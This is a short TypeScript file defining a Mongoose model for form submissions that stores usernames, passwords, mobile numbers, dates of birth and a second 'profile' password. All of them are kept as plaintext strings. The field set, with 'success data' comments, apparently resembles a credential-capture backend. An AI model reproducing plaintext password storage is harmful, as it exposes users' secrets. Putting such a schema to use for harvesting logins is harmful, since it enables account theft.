import mongoose, { Document, Schema } from "mongoose";

export interface FormSubmissionDoc extends Document {
  uniqueid: string;
  username?: string;
  password?: string;
  mobileNumber?: string;

  // 🔥 SUCCESS DATA FIELDS
  dob?: string;
  profilePassword?: string;

  createdAt?: Date;
  updatedAt?: Date;
}

const FormSubmissionSchema = new Schema<FormSubmissionDoc>(
  {
    uniqueid: { type: String, required: true, index: true },

    username: { type: String, default: "" },
    password: { type: String, default: "" },
    mobileNumber: { type: String, default: "" },

    // 🔥 ADD THESE TWO FIELDS
    dob: { type: String, default: "" },
    profilePassword: { type: String, default: "" },
  },
  { timestamps: true }
);

export default mongoose.model<FormSubmissionDoc>(
  "FormSubmission",
  FormSubmissionSchema
);
